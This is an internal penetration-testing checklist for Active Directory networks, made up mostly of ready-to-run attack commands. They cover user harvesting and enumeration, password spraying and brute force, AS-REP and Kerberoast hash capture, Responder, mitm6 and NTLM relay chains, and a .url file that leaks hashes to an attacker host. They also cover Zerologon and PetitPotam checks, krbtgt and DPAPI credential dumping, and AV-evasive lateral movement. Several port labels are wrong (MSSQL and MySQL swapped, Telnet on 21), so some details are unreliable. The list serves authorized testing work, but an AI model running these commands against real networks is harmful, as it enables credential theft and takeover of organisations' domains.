# Internal Pentesting Checklist CURRENTLY BEING UPDATED
## Uncredentialed
### Pre-Assessment
- [ ] User Identification: LinkedIn Scrape, Dehashed, OSINT
- [ ] Wordlist Building: Scrape websites, popular sports teams in the area, industry related words from the area. (If a zoo, popular zoo names, if a school, team names)
### Network Enumeration
- [ ] NMAP Ping scan for living hosts:
```nmap -sP -iL <IP FILE> -oA NmapLiveHosts.txt ```

- [ ] NMAP live host scanning:
```nmap -A -p- -iL NmapLiveHosts.txt  >> NmapHostsSummary.txt ```

- [ ] NMAP PCI Testing:
``` nmap -Pn -T5 -p 1-65535 -vv -iL IP.txt -oA output.txt ```

- [ ] Domain Discovery: Use CME to find the DC,
``` Crackmapexec smb X.X.X.X/24 -u '' -p '' ```

- [ ] Find the DC:
``` nslookup domain name ```

- [ ] Test for Null Domain Enumeration:
``` enum4linux X.X.X.X -A ```

- [ ] Test for ldap bind:
``` impacket-getadusers -all test.local/username:password -dc-ip X.X.X.X ```

- [ ] Screenshot any webpages in the network:
``` eyewitness --web -f <nmap IP file> ```

- [ ] DNS Footprinting:
``` nslookup -type=<recordtype> <target domain> ```

- [ ] DNS Zone Transfer:
``` dig axfr  <Domain_name> @name_server ```

- [ ] Obligatory SSL checks:
``` sslscan X.X.X.X ```

### User Identification, Test for default usernames or typical names
The goal is to build a comprehensive userlist and validate them against the AD using kerbrute.
- [ ] User Identification: LinkedIn Scrape, Dehashed, OSINT
      ``` # Inspect Web Page > Console > Under People**
      
      const profileTitles = document.querySelectorAll('.org-people-profile-card__profile-title');
          let textList = '';
          for (let i = 0; i < profileTitles.length; i++) {
          if (profileTitles[i].innerText === "LinkedIn Member") {
             continue;
          }
          textList += profileTitles[i].innerText + '\n';
          }
          console.log(textList);
      **# Use this in terminal for the file**
        awk '{split($1, first, ""); last = $2; gsub(" ", "", last); print toupper(first[1]) tolower(last)}' your_file.txt
      ```
- [ ] SMB User Enumeration
     ```#Various methods**
        crackmapexec smb X.X.X.X/24 --users
        nmap -p88 --script krb5-enum-users --script args="krb5-enum-users.realm''DOMAIN' .userdb=USERLIST X.X.X.X
        enum4linunx -U X.X.X.X
        impacket-lookupsid Domain/guest@x.x.x.x
        smbclient -U domain/admin \\\\X.X.X.X\\IPC$
     ```
    
- [ ] Printers Enumeration Users
   ** #Find printers in the network and see if they have admin open or default creds**
      use the address book to add users to your list
- [ ] Default Credentials
      https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
      https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv
- [ ] Get AD User List
``` GetADUsers.py DC.local/ -dc-ip 10.10.10.10 -debug
      # Capture Passwords
        awk -F: '{print $1}' your_file.txt
        awk -F: '{print $3}' your_file.txt

	Get Rid of Email portion
        awk -F'\\' '{print $2}'
```

### Password Attacks
- [ ] Kerbrute ```kerbrute userenum -d DOMAIN.com --dc X.X.X.X username.txt -o validUsers ```
- [ ] ASREP: see if any users had pre-authentication disabled
``` # Get hashes with no krb preauth, (add domain to your hosts file)
cme ldap 192.168.0.104 -u user.txt -p '' --asreproast output.txt
GetNPUsers.py 'DC.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.10
Hashcat module  18200
```
- [ ] CUPP can be used to build password possibilities
 Common User passwords profiler, need to know the password policy to be successful at this.
		automatic and interactive tool written in python for creating custom wordlists
		used to build passwords based oof well known details about the target THIS MEANS OSINT is needed
		This also has L33t mode which allows for someone to replace a,e,i,o,u with numbers.
	Running CUPP
		Install from git clone https:.//github.com/Mebus/cupp.git then run CMD: python3 cupp.py
		you can also include default creds from the alecto database using -a
### Poisoning
- [ ] NMAP to find hosts with SMB signing not enforced
```
nmap -p 445 --script=smb2-security-mode X.X.X.X
nmap -p 139--script=smb2-security-mode X.X.X.X
```
- [ ] Responder
 ``` # Responder
 responder -wrfvPd –I eth0
      
 # Relay
 impacket-Ntlmrelayx.py -tf targets.txt -smb2support --output-file ResponderHashes.txt
 Nc 127.0.0.1 11000 
 impacket-Ntlmrelayx.py --add-computer
      
 # Dont forget
 Hashes will be saved into a file so you will want to read the file to get user hashes
 ```
- [ ] MITM6
 ``` # Dump AD Information
mitm6 -d DOMAIN --ignore-nofqdn
Ntlmrelayx.py -6 –t ldaps://IP of DC –wh fakewpad.DOMAIN -l loot.txt  --no-smb-server -i

b. Combine mitm6, ntlmrelayx and RBCD to abuse AD defaults.
mitm6 -hw icorp-w10 -d internal.corp --ignore-nofqnd
ntlmrelayx.py -t ldaps://icorp-dc.internal.corp -wh attacker-wpad --delegate-access
getST.py -spn cifs/example.local example.local/NEW_PC_NAME\$ - impersonate admin
export KRB5CCNAME=admin.ccache
secretsdump.py -k -no-pass admin.ccache
# Relay an SMB authentication request to the DC. If it’s a DA account and vuln to CVE-
2019-1019, it will make a new DA account.
mitm6 -hw icorp-w10 -d internal.corp --ignore-nofqnd
ntlmrelayx.py -t ldaps://example.local -smb2support --remove-mic

 # Basic users can create computer accounts. This can help gain a foothold into AD.
mitm6 -hw icorp-w10 -d internal.corp --ignore-nofqnd
ntlmrelayx.py -t ldaps://example.local --add-computer
 ```

- [ ] WPAD attack
- [ ] URL File attack (for null access SMB Shares), Add a url file to a null file share then run responder
```	
InternetShortcut]
URL=anyurl
WorkingDirectory=anydir
IconFile=\\x.x.x.x\%USERNAME%.icon
IconIndex=1
```
### Protocol Attacks
General ports I typically see for quick wins but this is really elaborated upon in the worksheet
- [ ] SMB attacks: enumerate, vuln scan with NMAP
``` # SMB Enum
crackmapexec smb X.X.X.X -u '' -p '' --shares
smbclient -N -L \\\\X.X.X.X
rpcclient -N -L X.X.X.X.
nmap --script smb-enum-shares -p139,445 X.X.X.X\
enum4linux -a -u "" -p "" <DC IP>

# SMB Vulns
nmap -Pn --script smb-vuln* -p139,445 X.X.X.X

# Grab all Hosts with SMB Signing Disabled
crackmapexec smb NmapHostsSummary.txt --gen-relay-list smbrelay.txt
```
- [ ] LDAP: nmap
``` # DC Nulls
ldapsearch -x -h X.X.X.X -s base
nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>
```
- [ ] SNMP UDP 161
``` # Find SNMP
nmap -sU -sT -p 161 X.X.X.X

#Find string
nmap -sU -p 161 --script snmp-brute X.X.X.X --script-args snmp-brute.communitiesdb=wordlist
onesixtyone -c WORDLIST X.X.X.X

#Enumerate
snmpwalk -v2c -c STRING X.X.X.X .    # the end . is VITAL

# Grep through SNMP
grep -i "login\|fail" findings.snmp
grep -i "trap"  findings.snmp
grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" findings.snmp 

# Additional check
./changeme.py snmp://192.168.1.20
```
- [ ] MySQL 1433
```
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 X.X.X.X
```

- [ ] SQL 3306
```
mysql -u USERNAME -p PORT -h X.X.X.X
```

- [ ] HTTP/HTTPS
```
# Vuln Scan
whatweb

# Default Logins
nuclei -l urls.txt -t /root/nuclei-templates/default-logins

# See Web Application Testing
```

- [ ] SSH
```
# If you find id_rsa and pub
You need to add the id_rsa.pub to your authorized_keys in /.ssh to use the private without a password. If it says invalid, try sudo with it.

# Default Creds
./changeme.py --protocols ssh,ssh_key 192.168.59.0/2

# Brute Force
hydra -l username  -P /usr/share/wordlists/rockyou.txt X.X.X.X ssh
Use -L users.txt
```

- [ ] FTP
```
#Search for anonymous login
nmap -p 21 --script ftp-anon X.X.X.X/24

# Anony enabled
ls -lsa
If you see it enter Extended passive mode, just wait a long time, it may show stuff still
``` 
- [ ] WinRIM
- [ ] SMTP
``` #Check for Open Relay
telnet X.X.X.X 25
```

- [ ] Telnet 21
- [ ] Erlang 4369
```
#Enumerate
nmap -sV -Pn -n -T4 -p 4369 --script epmd-info <IP>

# RCE Identification - You need to leak the Authentication Code
erl -cookie YOURLEAKEDCOOKIE -name test2 -remsh test@target.fqdn

#Metasploit Module
msf5> use exploit/multi/misc/erlang_cookie_rce
```
- [ ] Java RMI 1099
- [ ] Webdav
```
# If we see IIS anywhere, look for Webdav
msfconsole > auxiliary/scanner/http/webdav_scanner > OPTIONS PATH=/dav/
 RHOSTS and RPORT                                                                           

# Other method to ID
davtest -url <URL>/dav         
                                                                                             
# Attack
cadaver <URL>/dav    You would want to upload a reverse http shell once connected and then navigate to the file.  DEFAULT CREDS: jigsaw:jigsaw  
``` 
- [ ] VNC
```
Check for null access
```
- [ ] NFS 2049
 ```
https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting
```
- [ ] NTP
```
nmap -sU -sV --script "ntp* and (discovery or vuln) and not (dos or brute)" -p 123 <IP>
```

## Credentialed
In this section you have compromised a user account
### AD Enumeration
#### Quick Wins 
- [ ] Run Bloodhound
```bloodhound-python -u user -p pass -ns X.X.X.X -d <domain> -c all```
- [ ] NoPAC
```crackmapexec smb <Domain Controller> -u 'user' -p 'pass' -M nopac```
- [ ] GPP Password
```crackmapexec smb <Domain Controller> -u username -p pass -M gpp_autologin
crackmapexec smb X.X.X.X -u USER -p PASS -M gpp_password
impacket-Get-GPPPassword 'domain.local/USER:PASSWORD@X.X.X.X'
```
- [ ] ASREP Roasting: Impacket, CME
```
crackmapexec ldap <Domain Controller> -u 'user' -p 'pass' --asreproast outfile.txt
Hashcat module  18200
```
- [ ] Kerberoasting: Bloodhound, impacket, CME
```
crackmapexec ldap <Domain Controller> -u 'user' -p 'pass' --kerberoasting outfile.txt
```
- [ ] Petitpotam
```
crackmapexec smb <Domain Controller> -u Administrator -p 'Password123!' -M petitpotam
```
- [ ] Zerologon
```
crackmapexec smb <Domain Controller> -u Administrator -p 'Password123!' -M zerologon
```
- [ ] Printer Bug
```
crackmapexec smb <Domain Controller> -u 'user' -p 'pass' -M spooler
```
- [ ] ACL Abuse: this is easily identified from Bloodhound

### Get AD Information
- [ ] Password in AD User Description
```crackmapexec ldap <Domain Controller> -u 'user' -p 'pass' -M get-desc-users```
- [ ] Get All AD Users with impacket-getadusers
```impacket-getadusers -all -dc-ip <IP> 'domain/username:password"```
- [ ] Pull groups, domain trusts, password policy with CME, review with bloodhound
```# Determine Access
cme smb x.x.x.x -u -p   (--local-auth) if local admin
# Find all share access
cme smb x.x.x.x -u -p --shares
# Determine if your user can winrm
crackmapexec winrm X.X.X.X -u -p 
# Sessions
cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>' --sessions
# Logged users
cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>' --loggedon-users
# Disks
cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>' --disks
# Users
cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>' --users
# Groups
cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>' --groups
# Local groups
cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>' --local-groups
# Password policy
cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>' --pass-pol
```
### File Hunting
- [ ] Use manspider to hunt for sensitive files
```
# Find words in files
manspider --threads 256 X.X.X.X/24 -u -p -c admin password  

# Find file names
manspider --threads 256 X.X.X.X/24 -u -p -f  admin  password
```
- [ ] Snaffler is another good tool
```
snaffler.exe -s -o snaffler.log
```

### AD Additional Attacks
- [ ] ADCS Attack
```
certipy-ad find -u NAME -p PASS -dc-ip IP
```

- [ ] Pingcastle
```
pingcastle.exe --healthcheck --server <DOMAIN_CONTROLLER_IP> --user <USERNAME> --password <PASSWORD>
```

- [ ] Unconstrained Delegation
- [ ] Resource Based Constrained Delegation
- [ ] Pass the Hash
- [ ] oken Imperonsation
- [ ] DC Sync
- [ ] Alternate Service Name
- [ ] S4U2 Self Abuse
- [ ] Shadow Credentials
- [ ] Silver Tickets
- [ ] Golden Tickets
- [ ] Diamond Tickets
- [ ] Forged Certificates

### Protocol Attacks
- [ ] SMB attacks: enumerate, vuln scan with NMAP
- [ ] LDAP: nmap
- [ ] SNMP UDP 161
- [ ] MySQL 1433: Attempt to login with windows auth then xp_command or relay attack
- [ ] SQL 3306
- [ ] HTTP/HTTPS
- [ ] SSH
- [ ] FTP
- [ ] WinRIM
- [ ] SMTP
- [ ] Telnet 21
- [ ] Erlang 4369
- [ ] Java RMI 1099
- [ ] Webdav
- [ ] VNC
- [ ] NFS 2049

### Elevated Access (Local admin)
- [ ] Hash Dumps with secretsdump, Donpapi, mimikatz
```
# User hash
secretsdump.py '<Domain>/<User>@<DC.IP>' -just-dc-user user1

# krbtgt hash dump -> Golden Ticket
secretsdump.py '<Domain>/<User>@<DC.IP>' -just-dc-user krbtgt

# Dump with local admin
secretsdump.py './<User>@<DC.IP>' -just-dc-user krbtgt

# The best way to dump hashes is using DonPapi
DonPAPI only uses local admin
DonPAPI.py domain/user:passw0rd@target
DonPAPI.py --hashes <LM>:<NT> domain/user@target
DonPAPI.py -k domain/user@target   KERBEROS
DonPAPI.py -local_auth user@target   LOCAL ADMIN

# Hashcat Module for NTLM
-m 1000

https://github.com/n0kovo/hashcat-rules-collection
https://github.com/n0kovo/hashcat-rules-collection
```

- [ ] Lateral movement: smbexec or wmiexec is often undetected, psexec works but move the file before launching
```
# impacket-psexec 
-uploads a file to the ADMIN$ share as an RPC service allowing a pipe convo.
impacket-psexec 'comapany/username:'password'@X.X.X.X'

# winrm
wmiexec- doesnt drop any files and is stealthier.  It runs the local user we connected with. Most modern AV catches this.
impacket-wmiexec 'domain/user:password@X.X.X.X'

# evil-winrm
nmap p5985,5986 X,X,X,X 
evil-winrm -i X.X.X.X -u USER -p PASS 
evil-winrm -i X.X.X.X -u USER -p PASS  -S  #SSL
evil-winrm -i X.X.X.X -u USER -H <HASH>  #hash only second part needed

# Impacket-smbexec
impacket-smbexec 'domain/user:password@X.X.X.X'

# SMB Connect
smbclient \\\\X.X.X.X\C$ -u domain/username
```

### Vulnerability Hunting
- [ ] Nanodump
- [ ] EternalBlue/Champion/Romance
- [ ] Printnightmare
- [ ] PrivExchange
- [ ] SMBBleed
- [ ] SMBGhost
- [ ] Apache Ghostcat
- [ ] JMI Insecure Endpoint
- [ ] NTP DDoS Amplification Attack
- [ ] Oracle Weblogic Deserialization
